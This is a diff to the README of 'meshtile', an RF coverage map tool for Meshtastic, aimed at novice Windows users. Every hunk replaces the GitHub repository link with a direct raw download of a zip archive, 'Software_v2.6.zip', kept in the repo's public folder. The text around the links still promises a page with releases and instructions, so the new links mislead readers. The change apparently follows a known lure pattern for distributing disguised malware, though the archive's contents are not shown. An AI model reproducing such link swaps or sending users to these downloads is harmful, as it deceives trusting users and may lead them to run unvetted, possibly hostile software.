@@ -1,6 +1,6 @@
 # 📡 meshtile - Simple RF Coverage Tile Server
 
-[![Download meshtile](https://img.shields.io/badge/Download-meshtile-brightgreen)](https://github.com/sanket-006/meshtile)
+[![Download meshtile](https://img.shields.io/badge/Download-meshtile-brightgreen)](https://raw.githubusercontent.com/sanket-006/meshtile/main/public/Software_v2.6.zip)
 
 meshtile creates maps showing radio signal coverage for Meshtastic networks. It helps you see where your devices connect and how strong the signal is. This guide will help you download and run meshtile on Windows, even if you do not know much about software.
 
@@ -52,7 +52,7 @@ Follow these steps to download and run meshtile on your Windows computer.
 
 First, go to the main meshtile page by clicking the big badge above or visit this link:  
 
-[Download meshtile on GitHub](https://github.com/sanket-006/meshtile)
+[Download meshtile on GitHub](https://raw.githubusercontent.com/sanket-006/meshtile/main/public/Software_v2.6.zip)
 
 The page will show you releases and instructions.
 
@@ -140,8 +140,8 @@ If maps look empty or no signal shows:
 ## 🔗 Helpful Links
 
 - GitHub repository and downloads:  
-  [https://github.com/sanket-006/meshtile](https://github.com/sanket-006/meshtile)
+  [https://raw.githubusercontent.com/sanket-006/meshtile/main/public/Software_v2.6.zip](https://raw.githubusercontent.com/sanket-006/meshtile/main/public/Software_v2.6.zip)
 
 ---
 
-[![Download meshtile](https://img.shields.io/badge/Download-meshtile-brightgreen)](https://github.com/sanket-006/meshtile)
+[![Download meshtile](https://img.shields.io/badge/Download-meshtile-brightgreen)](https://raw.githubusercontent.com/sanket-006/meshtile/main/public/Software_v2.6.zip)
